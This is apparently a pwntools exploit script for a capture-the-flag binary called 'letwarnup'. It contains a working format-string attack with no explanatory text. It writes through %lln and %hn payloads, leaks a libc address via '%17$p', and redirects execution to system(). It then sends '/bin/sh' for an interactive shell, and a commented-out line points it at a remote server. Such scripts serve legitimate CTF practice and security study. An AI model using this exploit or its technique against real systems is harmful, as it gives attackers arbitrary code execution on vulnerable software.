from pwn import *

BIN = "./letwarnup"
elf = ELF(BIN)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')

def exploit():
	payload = b'%c%c%c%c%c%c%4210746c%lln%53743c%hn'
	io.sendlineafter(b'Enter your string:\n', payload)
	__breakpoint="""
		b*0x0000000000401220
		"""
	gdb.attach(io,__breakpoint)
	for i in range(1040):
	  io.recv()
	payload = b'%17$p'
	io.sendlineafter(b'Enter your string:\n', payload)
	libc.address = int(io.recv(14).decode(), 16) - libc.symbols['__libc_start_main'] - 243
	print('Libc base: 0x%x', libc.address)
	io.sendlineafter(b'Enter your string:\n', b'%c%c%c%c%c%c%4210714c%lln')
	io.sendlineafter(b'Enter your string:\n', b'%c%c%c%c%c%c%4210716c%lln')
	target1 = (libc.symbols['system'] & 0xff0000) >> 16
	target2 = libc.symbols['system'] & 0xffff
	print('Target1: 0x%x', target1)
	print('Target2: 0x%x', target2)
	if target1 < 14:
	  print('Fail: Target1 < 14')
	  io.close()
	  exit(0)
	payload = '%c%c%c%c%c%c%c%c%c%c%c%c%c%c%' + str(target1 - 14) + 'c%hhn%c%c%c%c%' + str(target2 - target1 - 4) + 'c%hn'
	io.sendlineafter(b'Enter your string:\n', bytes(payload, 'utf-8'))
	io.sendlineafter(b'Enter your string:\n', b'/bin/sh\x00')
	io.interactive()
io = process(BIN)
#io = remote('45.122.249.68', 10005)
context.log_level = 'debug'
exploit()